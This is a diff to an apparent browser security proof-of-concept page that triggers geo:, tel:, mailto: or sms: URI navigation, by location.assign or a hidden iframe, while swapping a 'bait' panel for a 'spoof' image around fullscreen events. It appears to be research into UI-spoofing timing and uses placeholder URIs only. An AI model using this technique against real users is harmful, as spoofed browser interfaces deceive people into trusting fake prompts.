@@ -6,7 +6,7 @@
       name="viewport"
       content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"
     />
-    <title>tester-diag-fs-delay</title>
+    <title>tester-diag-nav-geo</title>
     <style>
       html,
       body {
@@ -74,14 +74,21 @@
     <img id="spoof" src="spoof.png" alt="spoof" decoding="sync" />
 
     <div id="bait">
-      <h2>Scheme &amp; Delayed Fullscreen Diag</h2>
-      <label for="schemeSelect">Target URI Scheme:</label>
+      <h2>Fast Navigation &amp; Fullscreen Diag</h2>
+      <label for="schemeSelect">Target URI:</label>
       <select id="schemeSelect">
         <option value="geo:0,0?q=test">geo: (geo:0,0?q=test)</option>
         <option value="tel:000000">tel: (tel:000000)</option>
         <option value="mailto:test@example.invalid">mailto: (mailto:test@example.invalid)</option>
         <option value="sms:000000">sms: (sms:000000)</option>
       </select>
+
+      <label for="modeSelect">Dispatch Mode:</label>
+      <select id="modeSelect">
+        <option value="location">location.assign (fast nav)</option>
+        <option value="iframe">hidden iframe</option>
+      </select>
+
       <button id="btn">run test</button>
     </div>
 
@@ -99,6 +106,7 @@
 
       const btn = document.getElementById("btn");
       const schemeSelect = document.getElementById("schemeSelect");
+      const modeSelect = document.getElementById("modeSelect");
       const bait = document.getElementById("bait");
       const spoof = document.getElementById("spoof");
       const overlay = document.getElementById("overlay");
@@ -110,13 +118,18 @@
         console.info(`[PoC +${ts}ms | act=${active}] ${label}`, extra);
       };
 
-      spoof.addEventListener("load", () => {
-        logEvent("spoof image loaded", `${spoof.naturalWidth}x${spoof.naturalHeight}`);
-      });
-
-      spoof.addEventListener("error", () => {
-        logEvent("spoof image failed to load");
-      });
+      const triggerScheme = (uri, mode) => {
+        if (mode === "location") {
+          window.location.assign(uri);
+          logEvent("location.assign invoked", uri);
+          return;
+        }
+        const frame = document.createElement("iframe");
+        frame.style.display = "none";
+        frame.src = uri;
+        document.body.appendChild(frame);
+        logEvent("scheme iframe appended", uri);
+      };
 
       document.addEventListener("fullscreenchange", () => {
         logEvent("fullscreenchange", `activeElement=${document.fullscreenElement?.id || "none"}`);
@@ -140,13 +153,11 @@
 
       btn.addEventListener("click", () => {
         const chosenUri = schemeSelect.value;
-        logEvent("click received", `uri=${chosenUri}`);
+        const chosenMode = modeSelect.value;
+        logEvent("click received", `mode=${chosenMode} uri=${chosenUri}`);
 
-        const frame = document.createElement("iframe");
-        frame.style.display = "none";
-        frame.src = chosenUri;
-        document.body.appendChild(frame);
-        logEvent("scheme iframe appended", chosenUri);
+        // Panggil navigasi skema seawal mungkin pada handler klik
+        triggerScheme(chosenUri, chosenMode);
 
         bait.style.display = "none";
         spoof.style.display = "block";
